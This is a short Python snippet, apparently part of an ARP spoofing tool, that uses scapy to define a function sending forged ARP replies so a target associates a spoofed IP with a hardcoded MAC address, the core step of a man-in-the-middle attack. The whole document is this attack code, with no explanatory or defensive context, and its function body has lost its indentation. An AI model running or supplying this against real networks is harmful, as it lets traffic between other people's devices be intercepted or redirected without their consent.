import scapy.all as scapy

def spoof(targetIp, spoofIp):
packet = scapy.ARP(op=2, pdst=targetIp, hwdst="00:23:d1:d0:cd:21", psrc=spoofIp)
scapy.send(packet)
